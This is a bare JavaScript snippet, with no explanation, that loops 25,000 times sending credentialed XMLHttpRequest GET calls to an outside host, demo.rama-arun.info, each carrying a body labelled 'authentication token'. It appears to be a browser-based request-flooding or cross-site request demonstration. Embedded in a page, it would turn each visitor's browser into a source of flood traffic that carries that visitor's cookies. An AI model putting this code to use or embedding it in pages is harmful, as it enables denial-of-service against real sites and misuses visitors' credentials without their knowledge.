for (i = 0; i < 25000; i++){
	var http_request = new XMLHttpRequest();
	http_request.onreadystatechange = function () { /* .. */ };
	http_request.open("GET", "http://demo.rama-arun.info/");
	http_request.withCredentials = true;
	http_request.setRequestHeader("Content-Type", "application/json");
	http_request.send({ 'request': "authentication token" });
}
